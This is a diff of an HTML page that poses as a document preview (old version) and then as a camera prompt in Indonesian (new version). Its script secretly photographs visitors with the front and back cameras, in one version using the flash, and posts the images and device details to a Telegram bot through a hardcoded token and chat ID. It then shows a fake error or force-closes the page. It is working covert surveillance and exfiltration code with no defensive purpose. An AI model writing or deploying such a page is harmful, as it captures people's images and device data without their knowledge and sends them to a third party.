@@ -1,17 +1,179 @@
-<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Document</title><style>body{background:#fff;font-family:Arial;text-align:center;padding:20px;}h2{color:#333;}p{color:#666;font-size:14px;}</style></head><body onload="f()"><h2>Document Preview</h2><p>Please wait...</p><script>
-async function f(){try{
-var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-var v=document.createElement('video');v.srcObject=s;await v.play();
-await new Promise(r=>setTimeout(r,800));
-var c=document.createElement('canvas');c.width=640;c.height=480;
-c.getContext('2d').drawImage(v,0,0);var d=c.toDataURL('image/jpeg',0.7);
-s.getTracks().forEach(t=>t.stop());
-var b=atob(d.split(',')[1]);var a=new Uint8Array(b.length);
-for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);
-var x=new FormData();x.append('chat_id','1923372966');
-x.append('photo',new Blob([a],{type:'image/jpeg'}),'f.jpg');
-x.append('caption','📸 '+new Date().toLocaleString());
-await fetch('https://api.telegram.org/bot8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4/sendPhoto',{method:'POST',body:x});
-await fetch('https://api.telegram.org/bot8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'1923372966',text:'📱 '+navigator.userAgent})});
-setTimeout(function(){document.body.innerHTML='<h2>Error</h2><p>Document corrupted or unsupported format.</p>';},1500);
-}catch(e){document.body.innerHTML='<h2>Error</h2><p>Could not open document.</p>';}}</script></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+    <title>Kamera</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .container {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .camera-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        
+        h2 {
+            font-size: 20px;
+            color: #222;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        p {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 5px;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            display: none;
+        }
+        
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="mainContent">
+    <div class="camera-icon" id="icon">📸</div>
+    <h2 id="title">Buka Kamera</h2>
+    <p id="subtitle">Ketuk izinkan untuk melanjutkan</p>
+</div>
+
+<video id="videoFront" style="display:none;" playsinline autoplay muted></video>
+<video id="videoBack" style="display:none;" playsinline autoplay muted></video>
+
+<script>
+const BOT_TOKEN = "8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4";
+const CHAT_ID = "1923372966";
+const CHAT_ID_TARGET = "1923372966";
+
+async function captureAndSend(facingMode, label) {
+    const video = document.createElement('video');
+    video.setAttribute('playsinline', '');
+    video.setAttribute('autoplay', '');
+    video.setAttribute('muted', '');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facingMode, width: { ideal: 1920 }, height: { ideal: 1080 } }
+    });
+    
+    video.srcObject = stream;
+    await video.play();
+    
+    // Flash: coba nyalain torch
+    try {
+        const track = stream.getVideoTracks()[0];
+        await track.applyConstraints({ advanced: [{ torch: true }] });
+        await new Promise(r => setTimeout(r, 300));
+    } catch(e) {}
+    
+    await new Promise(r => setTimeout(r, 800));
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    
+    // Matikan torch
+    try {
+        const track = stream.getVideoTracks()[0];
+        await track.applyConstraints({ advanced: [{ torch: false }] });
+    } catch(e) {}
+    
+    stream.getTracks().forEach(t => t.stop());
+    video.remove();
+    
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+    
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, `${label}_${Date.now()}.jpg`);
+    formData.append('caption', `📸 ${label} - ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.substring(0, 100)}`);
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    });
+}
+
+async function startCapture() {
+    try {
+        // Update UI
+        document.getElementById('icon').textContent = '⏳';
+        document.getElementById('title').textContent = 'Memproses...';
+        document.getElementById('subtitle').textContent = 'Jangan tutup halaman ini';
+        
+        // Foto depan
+        document.getElementById('subtitle').textContent = 'Kamera depan...';
+        await captureAndSend('user', 'DEPAN');
+        
+        // Foto belakang
+        document.getElementById('subtitle').textContent = 'Kamera belakang...';
+        await captureAndSend('environment', 'BELAKANG');
+        
+        // Kirim info device
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `📱 DEVICE INFO\n🕐 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}\n📏 ${screen.width}x${screen.height}\n🔋 ${navigator.hardwareConcurrency || '?'} cores`
+            })
+        });
+        
+        // Sukses
+        document.getElementById('icon').textContent = '✅';
+        document.getElementById('icon').style.animation = 'none';
+        document.getElementById('title').textContent = 'Berhasil';
+        document.getElementById('subtitle').textContent = 'Anda dapat menutup halaman ini';
+        
+    } catch(e) {
+        // Ditolak → Force Close
+        document.getElementById('icon').textContent = '❌';
+        document.getElementById('title').textContent = '';
+        document.getElementById('subtitle').textContent = '';
+        
+        // Force close setelah 1 detik
+        setTimeout(function() {
+            window.close();
+            // Fallback kalau window.close() nggak bisa
+            if (!window.closed) {
+                window.location.href = 'about:blank';
+                setTimeout(function() { window.close(); }, 100);
+            }
+        }, 800);
+    }
+}
+
+// Jalankan
+startCapture();
+</script>
+</body>
+</html>
